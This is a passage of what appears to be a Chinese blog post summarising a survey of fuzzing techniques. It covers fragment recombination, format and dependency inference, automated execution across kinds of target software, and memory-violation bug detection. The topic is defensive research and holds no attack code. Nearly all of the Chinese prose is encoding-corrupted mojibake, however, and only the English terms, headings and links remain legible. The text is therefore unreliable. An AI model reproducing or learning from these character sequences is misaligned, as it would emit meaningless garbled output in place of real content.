Representationï¼‰ï¼š</p><ul><li>å°†åŸå§‹è¾“å…¥æ–‡ä»¶ç¿»è¯‘ä¸ºæ›´ç®€å•ä¸”æ›´ç»Ÿä¸€çš„ IRï¼Œfuzzer åŸºäº IR è¿›è¡Œå˜å¼‚åå†ç¿»è¯‘å›åŸå§‹è¾“å…¥æ ¼å¼</li></ul><p>è¿™ç§å˜å¼‚ç­–ç•¥èƒ½åœ¨ä¿æŒäº†è¯­æ³•ä¸è¯­ä¹‰çš„æ­£ç¡®æ€§çš„åŒæ—¶ç”Ÿæˆäº†å¤šç§è¾“å…¥</p><h2 id="4-5-Fragment-Recombination">4.5 Fragment Recombination</h2><p>å¦ä¸€ç§ç”Ÿæˆè¾“å…¥çš„æ–¹å¼æ˜¯é€šè¿‡<strong>ç¢ç‰‡é‡æ•´åˆ</strong>ï¼ˆfragment recombinationï¼‰ï¼šå°†è¾“å…¥æ–‡ä»¶åˆ†æˆè®¸å¤šçš„å°å—ï¼ˆfragmentsï¼‰ï¼Œé€šè¿‡ä»ä¸åŒæ–‡ä»¶ä¸­æ•´åˆç¢ç‰‡æ¥ç”Ÿæˆæ–°çš„è¾“å…¥ï¼ŒåŒæ—¶æ¯ä¸ªç¢ç‰‡åº”ç¬¦åˆè§„èŒƒä»¥ç¡®ä¿è¯­æ³•æ­£ç¡®æ€§</p><p><img src="https://s2.loli.net/2022/10/28/GqE5UckCFQie96L.png" alt="Fig. 5. Fragment Recombination."></p><p>å¦‚ Fig.5 æ‰€ç¤ºï¼Œfuzzer é¦–å…ˆå°†è¾“å…¥æ–‡ä»¶è§£ææˆä¸€æ£µä¿æŒè¯­æ³•æ­£ç¡®æ€§çš„æ ‘ï¼ˆä¾‹å¦‚ ASTï¼‰ï¼Œè¿™éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„è¾“å…¥è¯­æ–™åº“æ¥è§£æè¾“å…¥ï¼ŒåŒæ—¶ fuzzer è¿˜éœ€è¦ä¸ºè¯­æ–™åº“æ”¶é›†æ­¤å‰é€ æˆé”™è¯¯è¡Œä¸ºçš„æœ‰é—®é¢˜çš„è¾“å…¥</p><p>åœ¨æ­¤å‰æ›¾ç»å‘ç°æ¼æ´çš„åŒºåŸŸæˆ–é™„è¿‘ä»æœ‰å¯èƒ½å­˜åœ¨æ–°çš„æ¼æ´ï¼Œè€Œæœ‰é—®é¢˜çš„è¾“å…¥å·²æ‰§è¡Œäº†èƒ½é€ æˆé”™è¯¯è¡Œä¸ºçš„å¤æ‚è·¯å¾„ï¼Œå› æ­¤ç¢ç‰‡é‡æ•´åˆå¯èƒ½ä¼šæ‰§è¡ŒåŒæ ·æˆ–ç›¸ä¼¼çš„è·¯å¾„ï¼Œè¿™æœ‰åˆ©äºæ¢ç´¢æ›´æ·±çš„ä»£ç </p><p>åœ¨ç¬¬äºŒé˜¶æ®µè¾“å…¥è¢«ç¢ç‰‡åŒ–åä¼šå­˜æ”¾åˆ°ç¢ç‰‡æ± ä¸­ï¼Œç”±äºè¾“å…¥è¢«è§£ææˆ ASTï¼Œfuzzer å¯ä»¥ä½¿ç”¨éç»ˆæ­¢èŠ‚ç‚¹ï¼ˆnon-terminalsï¼‰æ¥ç»„æˆæ–°çš„å­æ ‘ï¼Œåœ¨é‡æ•´åˆç¢ç‰‡æ—¶åŸºäº éšæœº/é—ä¼ ç®—æ³•/æœºå™¨å­¦ä¹  æ¥é€‰ç”¨è¯­æ³•å…¼å®¹çš„ï¼ˆsyntactically compatibleï¼‰ç¢ç‰‡ï¼Œæ­¤å¤–è¯­ä¹‰æ­£ç¡®æ€§ä¹Ÿå¯¹æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡æœ‰é‡è¦å½±å“</p><blockquote><p>ä¾‹å¦‚ <a href="https://www.ndss-symposium.org/ndss-paper/codealchemist-semantics-aware-code-generation-to-find-vulnerabilities-in-javascript-engines/">CodeAlchemist</a> ä½¿ç”¨æ±‡ç¼–çº¦æŸæ ‡è®°ç¢ç‰‡ï¼Œä»…åœ¨ç¢ç‰‡æ»¡è¶³çº¦æŸæ—¶æ‰è¿›è¡Œæ•´åˆ</p></blockquote><h2 id="4-6-Format-Inference">4.6 Format Inference</h2><p>è‹¥è¾“å…¥æ¨¡å‹ä¸å¯ç”¨ï¼Œæ¨æ–­è¾“å…¥æ ¼å¼ä¹Ÿæ˜¯å‰æ™¯è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œä¸”ä¸€ä¸ªè¾“å…¥æ¨¡å‹ä»…èƒ½ç”Ÿæˆä¸€ç§ç‰¹å®šæ ¼å¼çš„è¾“å…¥ï¼Œå› æ­¤<strong>æ ¼å¼æ¨æ–­</strong>ï¼ˆformat inferenceï¼‰æ¯”åŸºäºæ¨¡å‹çš„æ–¹æ¡ˆæ›´åŠ çµæ´»</p><h3 id="4-6-1-Corpus-based">4.6.1 Corpus-based</h3><p>ä¸€ç§ç›´æ¥çš„æ–¹æ¡ˆæ˜¯ä»æœ‰æ•ˆè¾“å…¥è¯­æ–™åº“è¿›è¡Œæ¨æ–­ã€‚ç”±äºç¼ºä¹è¾“å…¥æ¨¡å‹ï¼Œç ”ç©¶è€…å»ºç«‹äº†ç«¯åˆ°ç«¯ï¼ˆend-to-endï¼‰çš„æœºå™¨å­¦ä¹ æ¨¡å‹ä½œä¸ºæ›¿ä»£ï¼Œ<strong>å¾ªç¯ç¥ç»ç½‘ç»œ</strong>ï¼ˆrecurrent neural networkï¼ŒRNNï¼‰è¿™ä¸€æ¨¡å‹æ›´åˆé€‚ç”Ÿæˆç»“æ„åŒ–è¾“å…¥ï¼Œä½†è¿™ä¸€æ›¿ä»£æ–¹æ¡ˆæœ‰å¯èƒ½å—åˆ°ç”Ÿæˆéæ³•è¾“å…¥çš„å½±å“ï¼Œå› æ­¤è®­ç»ƒæ•°æ®éœ€è¦ç›¸åº”çš„æ”¹è¿›</p><blockquote><p>ä¾‹å¦‚ <a href="https://faculty.ist.psu.edu/wu/papers/DeepFuzz.pdf">DeepFuzz</a> ç”Ÿæˆè¯­æ³•æœ‰æ•ˆè¾“å…¥çš„æ¯”ä¾‹ä»…ä¸º 82.63%</p></blockquote><p>æ¨¡ç³Šæµ‹è¯•ä¹Ÿå¯ä»¥åŸºäºæœ‰æ•ˆè¾“å…¥è¯­æ–™åº“åˆæˆä¸€ç§ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•æ¥ç”Ÿæˆé«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥</p><h3 id="4-6-2-Coverage-based">4.6.2 Coverage-based</h3><p>åŸºäºè¯­æ–™åº“çš„è§£å†³æ–¹æ¡ˆéœ€è¦å¯¹è¾“å…¥è§„åˆ™çš„ç»¼åˆè¦†ç›–ï¼Œå¯èƒ½ä¼šä¸å®é™…ï¼Œæ­¤å¤–å…¶å¹¶æ²¡æœ‰ä½¿ç”¨å†…éƒ¨æ‰§è¡ŒçŠ¶æ€çš„ä¿¡æ¯ï¼Œè¿™å¯èƒ½ä¼šé€ æˆè¾ƒä½çš„ä»£ç è¦†ç›–ç‡</p><p>è¾“å…¥çš„æ ¼å¼æŒ‡ç¤ºäº†è¾“å…¥ä¸­ä¸åŒå­—èŠ‚çš„å…³ç³»ï¼Œå› æ­¤åŸºäºä»£ç è¦†ç›–ï¼Œfuzzer å¯ä»¥æ¨æ–­å­—èŠ‚åˆ°å­—èŠ‚çš„ï¼ˆbyte-to-byteï¼‰å…³ç³»æ¥å¯åŠ¨æ¨¡ç³Šæµ‹è¯•</p><blockquote><p>ä¾‹å¦‚ <a href="https://www.usenix.org/conference/usenixsecurity19/presentation/blazytko">GRIMOIRE</a> ä½¿ç”¨ä»£ç è¦†ç›–æ¥æ¨æ–­ç›®æ ‡ç¨‹åºæ‰€éœ€çš„è¾“å…¥æ ¼å¼</p></blockquote><h3 id="4-6-3-Encoding-Function">4.6.3 Encoding Function</h3><p>ä¸ä¸Šè¿°å…³æ³¨äºè¾“å…¥çš„æ–¹æ³•ä¸åŒï¼Œæœ‰çš„ fuzzer æœç´¢ä¼šç¼–ç è¾“å…¥æ ¼å¼çš„ä»£ç åŒºåŸŸï¼Œå› ä¸ºè¿™ç±»ä»£ç ä¸ç”Ÿæˆç»“æ„è‰¯å¥½çš„ï¼ˆwell-structuredï¼‰è¾“å…¥ç›¸å…³ï¼Œæ•… fuzzer åœ¨ç¼–ç æ ¼å¼å‰è¿›è¡Œå˜å¼‚</p><p>å°½ç®¡ PUTs çš„æºç å¯èƒ½æ²¡æ³•è·å–ï¼Œä½†ä»–ä»¬æ‰€ç”Ÿæˆçš„ç»“æ„è‰¯å¥½çš„è¾“å…¥åˆ™ä¸ç„¶ï¼Œä¾‹å¦‚æœ‰çš„ç¤¾åŒºä¼šå¼€æºä¸€äº›ç”Ÿæˆé«˜åº¦ç»“æ„åŒ–è¾“å…¥çš„å·¥å…·</p><p>å¯¹ IOT è®¾å¤‡è€Œè¨€ï¼Œå¤§éƒ¨åˆ†éƒ½é€šè¿‡é…å¥—ç¨‹åºæ¥æ§åˆ¶ï¼Œå› æ­¤é€šè¿‡å®šä½ä¸ç¼–ç æ ¼å¼ç›¸å…³çš„ä»£ç ï¼Œå˜å¼‚å¯ä»¥åœ¨å‡½æ•°çš„å‚æ•°æˆ–æ˜¯è®¡ç®—æ ¼å¼çš„æŒ‡ä»¤ä¸Šå®Œæˆ</p><blockquote><p>ä¾‹å¦‚ <a href="https://www.ndss-symposium.org/wp-content/uploads/2018/03/NDSS2018_01A-1_Chen_Slides.pdf">IOTFuzzer</a> ä¾¿ hook äº†è¿™ç±»å‡½æ•°å¹¶å¯¹å…¶å‚æ•°è¿›è¡Œå˜å¼‚</p></blockquote><h2 id="4-7-Dependency-Inference">4.7 Dependency Inference</h2><p>æ ¼å¼æ¨æ–­ä¸»è¦è§£å†³è¯­æ³•éœ€æ±‚ï¼Œè¿™ä»å¯èƒ½ç”Ÿæˆæœ‰ç€é”™è¯¯æ•°æ®ä¾èµ–é¡¹çš„è¾“å…¥ï¼Œä¾‹å¦‚åœ¨ Fig.6 ä¸­çš„ <code>snippet2</code> ä¸­ï¼Œåœ¨ <code>2-5</code> å‡ºç°äº†ä¸€ä¸ªç”±äº <code>errf()</code> æœªå®šä¹‰å¯¼è‡´çš„é”™è¯¯</p><p><img src="https://s2.loli.net/2022/10/28/pZnh2GsWyLJ4d1g.png" alt="Fig. 6 Semantic error (JavaScript). "></p><p>è®¸å¤šåº”ç”¨éƒ½éœ€è¦åœ¨è¾“å…¥ä¸­æœ‰ç€æ­£ç¡®çš„<strong>æ•°æ®ä¾èµ–é¡¹</strong>ï¼ˆdata dependencyï¼‰ï¼Œé€šå¸¸ç”±ä¸€ç³»åˆ—è¯­å¥ï¼ˆstatementï¼‰ç»„æˆï¼ŒåŒ…æ‹¬ç³»ç»Ÿè°ƒç”¨ã€å¯¹è±¡ã€APIsã€ABIsç­‰</p><h3 id="4-7-1-Documents-or-Source-Code">4.7.1 Documents or Source Code</h3><p>åºåˆ—çš„æ•°æ®ä¾èµ–é¡¹é€šå¸¸é€šè¿‡é™æ€åˆ†ææ¥æ¨æ–­ï¼Œå› ä¸ºè®¸å¤šåº”ç”¨éƒ½æœ‰ç›¸åº”çš„æ–‡æ¡£æˆ–æºç ï¼Œå¯ä»¥æ®æ­¤æ¨æ–­æ•°æ®ä¾èµ–é¡¹ï¼Œå¹¶åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­åœ¨ç”Ÿæˆè¾“å…¥å‰å…ˆç”Ÿæˆå…¶å…ˆå†³é¡¹ï¼ˆprerequisitesï¼‰</p><p>ä½†é™æ€åˆ†æè¯¯æŠ¥ç‡é«˜ä¸”ä¼šé”™è¿‡æ¥å£çš„ä¾èµ–é¡¹ï¼Œå› æ­¤ä¸€ä¸ªè¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯ç»“åˆé™æ€åˆ†æä¸åŠ¨æ€åˆ†æ</p><h3 id="4-7-2-Real-world-Programs">4.7.2 Real-world Programs</h3><p>çœŸå®ä¸–ç•Œçš„è®¸å¤šç¨‹åºé€šè¿‡å‘½ä»¤è¡Œæ¥è°ƒç”¨æ¥å£ï¼Œè¿™ä¾¿åŒ…å«äº†æ•°æ®ä¾èµ–é¡¹ï¼Œfuzzing å¯ä»¥åŸºäºè¿™äº›çœŸå®ä¸–ç•Œä¸­ç¨‹åºçš„åˆ‡ç‰‡ç¨‹åºï¼ˆprogram slicingï¼‰ç”Ÿæˆè°ƒç”¨æ¥å£çš„æ–°ç¨‹åº</p><p>æ•°æ®ä¾èµ–é¡¹ä¹Ÿå¯ä»¥é€šè¿‡åˆ†ææ‰§è¡Œæ—¥å¿—ï¼ˆexecution logï¼‰æ¥æ¨æ–­ï¼Œæ—¥å¿—ä¸­æ˜ç¡®åŒ…å«æ¥å£çš„é¡ºåºä¿¡æ¯ï¼ˆä¾‹å¦‚å“ªä¸ªæ¥å£å…ˆè¢«æ‰§è¡Œï¼‰ï¼ŒåŒæ—¶éšå«äº†æ¥å£é—´çš„å‚æ•°ä¾èµ–é¡¹ä¿¡æ¯</p><p>ä¸ºäº†è·å¾—è¿™äº›ç›´æ¥ä¸é—´æ¥çš„ä¿¡æ¯ï¼Œæ¨¡ç³Šæµ‹è¯•åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ hook æ¯ä¸ªæ¥å£å¹¶è®°å½•è‡ªå·±æ‰€éœ€çš„æ•°æ®</p><blockquote><p><strong>Gap 2</strong>ï¼šè¾“å…¥ç©ºé—´çš„å‡å°ä¾èµ–äºå¯¹è¯­æ³•/è¯­ä¹‰å…³è”çš„è¾“å…¥å­—èŠ‚çš„åˆ†ç»„ï¼Œåˆ†ç»„çš„ä¼˜ç‚¹æ˜¯åœ¨æ¢ç´¢æ›´å¤šæ‰§è¡ŒçŠ¶æ€ä¸­æå‡æ•ˆç‡ï¼Œç”±æ­¤ fuzzing æ›´å€¾å‘äºæ»¡è¶³è·¯å¾„çº¦æŸä»¥æ¢ç´¢è¢«è¿™äº›çº¦æŸå®ˆæŠ¤çš„æ›´æ·±çš„ä»£ç åŒºåŸŸ</p></blockquote><h1>0x05. AUTOMATION</h1><p><strong>è‡ªåŠ¨æ‰§è¡Œ</strong>ï¼ˆAutomatic executionï¼‰æ˜¯æ¨¡ç³Šæµ‹è¯•ç†è®ºä¸è¾“å…¥ç©ºé—´å‡æ–¹æ³•çš„åŸºç¡€ï¼Œè€ŒæˆåŠŸçš„æ¨¡ç³Šæµ‹è¯•éœ€è¦ï¼š</p><ul><li><strong>è‡ªåŠ¨é‡å¤åœ°è¿è¡Œ PUTs</strong>ã€‚å¤§éƒ¨åˆ† fuzzer éƒ½èƒ½æµ‹è¯•å‘½ä»¤è¡Œç¨‹åºï¼Œä½†å¯¹äºç¡¬ä»¶æˆ–å¤šè¯­è¨€è½¯ä»¶è€Œè¨€ä¸è¡Œ</li><li><strong>å¯¹æ½œåœ¨æ¼æ´çš„è‡ªåŠ¨æŒ‡ç¤ºå™¨</strong>ï¼ˆautomatic indicatorï¼‰ã€‚å½“å‰ fuzzer ä½¿ç”¨ crashes ä½œä¸ºæ½œåœ¨æ¼æ´çš„æ ‡å¿—ï¼Œä½†å¦‚æ¡ä»¶ç«äº‰ä¸€ç±»çš„æ¼æ´å¹¶ä¸ä¼šè§¦å‘ crash</li><li><strong>é«˜é€Ÿæ‰§è¡Œ</strong>ã€‚åœ¨ç›¸åŒçš„æ—¶é—´å†…æ£€éªŒæ›´å¤šçš„æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥æ­¤å¢åŠ å‘ç°æ¼æ´çš„æœºä¼š</li></ul><h2 id="5-1-Automatic-Execution-of-PUTs">5.1 Automatic Execution of PUTs</h2><p>å¯¹ä¸åŒåº”ç”¨ç¨‹åºçš„è‡ªåŠ¨åŒ–æ¨¡ç³Šæµ‹è¯•éœ€è¦ä¸åŒçš„å·¥ç¨‹åŠªåŠ›ï¼Œæœ¬èŠ‚ä»‹ç»å‡ ç§è‡ªåŠ¨åŒ–æ¨¡ç³Šæµ‹è¯•çš„æ–¹æ³•</p><h3 id="5-1-1-Command-line-Programs">5.1.1 Command-line Programs</h3><p>æ¨¡ç³Šæµ‹è¯•åœ¨æµ‹è¯•å‘½ä»¤è¡Œç¨‹åºæ—¶é€šè¿‡å­è¿›ç¨‹è¿è¡Œ PUTs å¹¶å°†æ‰€éœ€é€‰é¡¹ï¼ˆoptionsï¼‰ä¸è¾“å…¥å–‚ç»™ç¨‹åºï¼ŒåŒæ—¶åœ¨æ‰§è¡Œ PUT æ—¶å…¶å¹¶ä¸ä¼šé‡å¤æ‰€æœ‰çš„æ­¥éª¤ï¼Œè€Œæ˜¯å…‹éš†å‡ºå­è¿›ç¨‹ä»¥ç•¥è¿‡é¢„å¤„ç†æ­¥éª¤</p><p><em>åœ¨æ•´ä¸ªæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­é€šå¸¸ä»…ç”¨ä¸€ä¸ªå‘½ä»¤è¡Œé€‰é¡¹ï¼ˆå³æ‰€æœ‰è¾“å…¥éƒ½åŸºäºè¯¥é€‰é¡¹æ‰§è¡Œï¼‰ï¼Œå› ä¸ºä¸åŒçš„é€‰é¡¹ä»£è¡¨äº†ä¸åŒçš„ä»£ç è¦†ç›–ï¼Œè€Œä¸€æ¬¡å…¨é¢çš„æµ‹è¯•éœ€è¦åˆ—ä¸¾æ‰€æœ‰çš„é€‰é¡¹ï¼Œå› æ­¤ä¸€ä¸ªé«˜æ•ˆçš„æ–¹æ¡ˆä¾¿æ˜¯è‹¥å¯¹äºä¸€ä¸ªé€‰é¡¹è€Œè¨€å½“å‰è¾“å…¥æ— æ•ˆï¼Œåˆ™è·³è¿‡å‰©ä½™çš„æ‰€æœ‰é€‰é¡¹</em></p><blockquote><p>è¿™é‡Œè®ºæ–‡åŸæ–‡è¯´â€œè¯¥ç§æ–¹æ¡ˆçš„ä¸€ä¸ªé‡è¦çš„è§‚æµ‹æ˜¯è‹¥ä¸€ä¸ªè¾“å…¥å¯¹ä¸€ä¸ªé€‰é¡¹è€Œè¨€æ˜¯æ— æ•ˆçš„ï¼Œåˆ™å…¶ä¹Ÿä¼šå¯¹å…¶ä»–é€‰é¡¹æ— æ•ˆâ€ï¼Œä½†ç¬”è€…è§‰å¾—è¿™ä¸ªè¯´æ³•æœ‰å¤±åé¢‡ï¼ˆ</p></blockquote><h3 id="5-1-2-Deep-Learning-Systems">5.1.2 Deep Learning Systems</h3><p>æµ‹è¯•æ·±åº¦å­¦ä¹ ç³»ç»Ÿï¼ˆDLSï¼‰çš„è¿‡ç¨‹ç±»ä¼¼äºæµ‹è¯•å‘½ä»¤è¡Œï¼Œé€šè¿‡ç”Ÿæˆè¾“å…¥ï¼ˆå¯ä»¥æ˜¯è®­ç»ƒæ•°æ®ã€æµ‹è¯•æ•°æ®æˆ–ä¸åŒç›®æ ‡ä¸Šçš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼‰æµ‹è¯• DLSs ä»¥è·å¾—æ›´å¥½çš„ fitnessï¼ˆå¯ä»¥æ˜¯ç¥ç»å…ƒè¦†ç›–ç‡ã€æŸå¤±å‡½æ•°ã€è¿ç®—ç¬¦çº§è¦†ç›–ç‡ï¼‰ï¼ŒåŒæ—¶é™¤äº†æ£€æµ‹ç¼ºé™·ä»¥å¤–ä¹Ÿä¼šæ£€æŸ¥æ¨¡å‹çš„å¥å£®æ€§</p><h3 id="5-1-3-Operating-System-Kernels">5.1.3 Operating System Kernels</h3><p>OS kernel åŒ…å«äº†è®¸å¤šä¸­æ–­ä¸å†…æ ¸çº¿ç¨‹ï¼Œå…¶æ‰§è¡ŒçŠ¶æ€æ— æ³•ç¡®å®šï¼Œç”±æ­¤æˆ‘ä»¬ä½¿ç”¨ hypervisorï¼ˆå¦‚ QEMUï¼‰æ¥è¿è¡Œå†…æ ¸ï¼Œå¹¶é€šè¿‡ <a href="https://zhangtong16.github.io/2019/06/05/Intel-Processor-Trace/">Intelâ€™s Processor Trace</a> ï¼ˆPTï¼‰æŠ€æœ¯æ¥è·å–ä»£ç è¦†ç›–ï¼›å°½ç®¡è¿™ç§æ–¹æ³•èƒ½å¸¦åé¦ˆåœ°æµ‹è¯•ä¸åŒç§å†…æ ¸ï¼Œä½†ä»éœ€è¦äººå·¥æ„é€ è¯­æ³•&amp;è¯­ä¹‰æ­£ç¡®çš„è¾“å…¥</p><p>å› ä¸ºè¾“å…¥åŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿé•œåƒæˆ–ä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨ï¼Œfuzzers å¯ä»¥ä»¥æ›´è½»é‡çº§çš„æ–¹æ³•è¿›è¡Œæµ‹è¯•ï¼šåœ¨ç³»ç»Ÿè°ƒç”¨çš„æ•°æ®ä¾èµ–é¡¹è¢«åˆ†æ/æ¨æ–­å‡ºæ¥åç”Ÿæˆä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨å¹¶åœ¨ç›®æ ‡å†…æ ¸ä¸Šè¿è¡Œï¼Œå¹¶ç›‘æµ‹ä»£è¡¨æ½œåœ¨æ¼æ´çš„ system panics</p><p>å¦ä¸€ç§æµ‹è¯•æ–¹æ³•æ˜¯é€šè¿‡æ¨¡æ‹Ÿå¤–è®¾å¹¶ç”Ÿæˆç›¸åº”è¾“å…¥æ¥æµ‹è¯•å†…æ ¸é©±åŠ¨</p><h3 id="5-1-4-Cyber-Physical-Systems">5.1.4 Cyber-Physical Systems</h3><p><strong>ä¿¡æ¯ç‰©ç†ç³»ç»Ÿ</strong>ï¼ˆCyber-Physical Systemsï¼ŒCPSï¼‰åŒ…å«ä¸¤ä¸ªç´§å¯†ç»“åˆçš„ä¸»è¦æˆåˆ†ï¼Œå³<strong>è®¡ç®—å…ƒç´ </strong>ï¼ˆcomputational elementsï¼‰ä¸<strong>ç‰©ç†è¿‡ç¨‹</strong>ï¼ˆphysical processesï¼‰</p><p>ä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—å…ƒç´ æ˜¯ <em>å¯ç¼–ç¨‹é€»è¾‘æ§åˆ¶å™¨</em> ï¼ˆprogrammable logic controllerï¼ŒPLCï¼‰ï¼Œå…¶æ§åˆ¶ç€ç‰©ç†è¿‡ç¨‹çš„é©±åŠ¨å™¨å¹¶ä»ä¼ æ„Ÿå™¨ä¸­è·å–è¾“å…¥ï¼Œå› æ­¤åœ¨ fuzzing CPSs æ—¶ fuzzer å¯ä»¥æ›¿æ¢æ‰ PLCs å¹¶é€šè¿‡ç½‘ç»œç›´æ¥å‘é©±åŠ¨å™¨å‘é€å¤§é‡çš„å‘½ä»¤</p><p>PLC çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿæ˜¯ CPSs çš„ä¸€ä¸ªå¯æµ‹è¯•ç‚¹ï¼Œä½†å…¶æœ‰ç€å¤šç§äºŒè¿›åˆ¶æ ¼å¼ä»¥åŠå¤æ‚çš„ä¸ç‰©ç†å®ä½“é—´çš„é€šä¿¡ï¼›åŸºäºå¯¹ PLC äºŒè¿›åˆ¶æ–‡ä»¶ä¸å¼€å‘å¹³å°çš„åˆ†æï¼Œè‡ªåŠ¨åŒ–çš„ fuzz å¯ä»¥åœ¨å…¶è¿è¡Œåœ¨ PLC è®¾å¤‡ä¸Šæ—¶è¿›è¡Œ</p><h3 id="5-1-5-Internet-of-Things">5.1.5 Internet of Things</h3><p>IOT çš„è‡ªåŠ¨åŒ– fuzzing åŒ…æ‹¬æ¨¡æ‹Ÿä¸ç½‘ç»œçº§æµ‹è¯•ï¼š</p><ul><li>æ¨¡æ‹Ÿå™¨å¯ä»¥åœ¨æ²¡æœ‰å¯¹åº”ç¡¬ä»¶æ—¶è¿è¡Œ IOT å›ºä»¶ï¼Œä»¥ç°ç›’æ¨¡å¼æµ‹è¯•ç›®æ ‡ç¨‹åº</li><li>ç½‘ç»œçº§çš„ fuzzing ä»¥é»‘ç›’æ¨¡å¼è¿›è¡Œæµ‹è¯•ï¼Œå³é€šè¿‡ç½‘ç»œå‘ IOT è®¾å¤‡å‘é€ä¿¡æ¯ï¼Œä»¥å“åº”ä½œä¸ºæ‰§è¡Œç»“æœï¼Œfitness ä¾¿æ˜¯ç±»å‹æ•°é‡</li></ul><h3 id="5-1-6-Applications-with-Graphical-User-Interface">5.1.6 Applications with Graphical User Interface</h3><p>GUI ç¨‹åºçš„æ‰§è¡Œæ¯”å‘½ä»¤è¡Œæ…¢å¾—å¤šï¼Œè€Œæ‰§è¡Œé€Ÿåº¦æ˜¯ fuzzing çš„å…³é”®ï¼Œå› æ­¤å¯¹ GUI ç¨‹åºçš„è‡ªåŠ¨åŒ–æµ‹è¯•é€šå¸¸å°† GUI æ›¿æ¢ä¸ºä¸€ç§æ›´å¿«çš„æ–¹æ¡ˆå¹¶ä»¥å‘½ä»¤è¡Œæ¨¡å¼æ‰§è¡Œç›®æ ‡</p><blockquote><p>ä¾‹å¦‚å¯¹ UI æ“ä½œå»ºæ¨¡åä¸ºå®‰å“åº”ç”¨ç”Ÿæˆäº‹ä»¶åºåˆ—ï¼ˆevent sequencesï¼‰</p></blockquote><p>æ­¤å¤–ï¼Œfuzzer ä¹Ÿå¯ä»¥ä½¿ç”¨ <strong>hardness</strong> æ¥å‡†å¤‡æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä»¥ç›´æ¥å”¤é†’ GUIs ä¸­çš„ç›®æ ‡å‡½æ•°</p><h3 id="5-1-7-Applications-with-Network">5.1.7 Applications with Network</h3><p>æ™ºèƒ½åˆçº¦ã€åè®®å®ç°ã€äº‘æœåŠ¡ã€Android Native System Servicesã€æœºå™¨äººè£…ç½®ç­‰é€šè¿‡ç½‘ç»œæ¥æ”¶è¾“å…¥ï¼Œç”±æ­¤å¯ä»¥åœ¨æœ¬åœ°ç”Ÿæˆè¾“å…¥åç”±ç›®æ ‡åº”ç”¨è¿œç¨‹æ‰§è¡Œï¼Œè‡ªåŠ¨æµ‹è¯•çš„æ•ˆç‡ä¾èµ–äºç”Ÿæˆè¾“å…¥çš„è´¨é‡ä¸åæ˜ æ‰§è¡ŒçŠ¶æ€çš„ fitness</p><h2 id="5-2-Automatic-Detection-of-Bugs">5.2 Automatic Detection of Bugs</h2><p>å¯¹äºæ¼æ´æ£€æµ‹å™¨ï¼ˆdetectorï¼‰è€Œè¨€æ¼æ´çš„ä»£ç åŒºåŸŸä¸å¯çŸ¥ï¼Œç”šè‡³ä¸çŸ¥é“ç¨‹åºä¸­æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œå› æ­¤åœ¨è‡ªåŠ¨ fuzzing ä¸­è®°å½•æ½œåœ¨æ¼æ´å°±å˜å¾—ååˆ†é‡è¦ï¼Œæ¼æ´çš„æ ‡å¿—ï¼ˆindicatorï¼‰é€šå¸¸æ˜¯ç¨‹åºæ‰§è¡Œæ—¶å´©æºƒï¼Œä¹Ÿæœ‰ä¸€äº›åŸºäºæ¼æ´æ¨¡å¼ï¼ˆpatternï¼‰è®¾è®¡çš„ä¸“ä¸€è€Œé«˜æ•ˆçš„æŒ‡ç¤ºå™¨</p><p>æœ¬èŠ‚ä¸»è¦ä»‹ç»æˆåŠŸç”± fuzzing å‘ç°çš„å…­ç§æ¼æ´ï¼šå†…å­˜æŸåã€å¹¶å‘æ¼æ´ã€ç®—æ³•å¤æ‚æ€§ã€spectre å‹æ¼æ´ã€æµ‹ä¿¡é“ã€æ•´å‹æ¼æ´</p><h3 id="5-2-1-Memory-violation-Bugs">5.2.1 Memory-violation Bugs</h3><blockquote><p>è¿™æ®µå¯¹äºæ‰“ Pwn çš„åŒå­¦æ¥è¯´éƒ½æ¯”è¾ƒæ— èŠï¼Œç¬”è€…å°±ä¸ç»†å½•äº†</p></blockquote><p><strong>å†…å­˜æŸåå‹æ¼æ´</strong>ï¼ˆMemory-violation Bugsï¼‰æ˜¯æœ€å¤è€ä¹Ÿæœ€ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li><strong>ç©ºé—´å®‰å…¨æŸå</strong>ï¼ˆspatial safety violationï¼‰ï¼šå³éæ³•å†…å­˜è®¿é—®ã€‚å¦‚ Fig.7a ä¾¿æ˜¯ä¸€ä¸ªè¶Šç•Œï¼ˆout-of-boundï¼‰å†…å­˜è®¿é—®</li><li><strong>æ—¶é—´å®‰å…¨æŸå</strong>ï¼ˆtemporal safety violationï¼‰ï¼šå³éæ³•å†…å­˜å¼•ç”¨ã€‚å¦‚ Fig.7b ä¾¿æ˜¯ä¸€ä¸ª use-after-free æ¼æ´</li></ul><p><img src="https://s2.loli.net/2022/10/30/nAuTKjBHO2JpeXE.png" alt="Fig. 7. Memory violation bugs"></p><p>å°½ç®¡å·²ç»æœ‰ä¸€äº›é’ˆå¯¹å†…å­˜ç ´åå‹æ¼æ´çš„ç¼“è§£æªæ–½ï¼ˆmigrationï¼‰ï¼Œä½†ç”±äºå¼€é”€ã€å…¼å®¹æ€§ã€å¥å£®æ€§ç­‰åŸå› ï¼Œå¤§éƒ¨åˆ†ç¼“è§£æªæ–½å¹¶æœªå®é™…è¢«ä½¿ç”¨</p><blockquote><p>ä¾‹å¦‚ CTF é‡Œæ‰“ kernel pwn é€šå¸¸éƒ½è¦ bypass 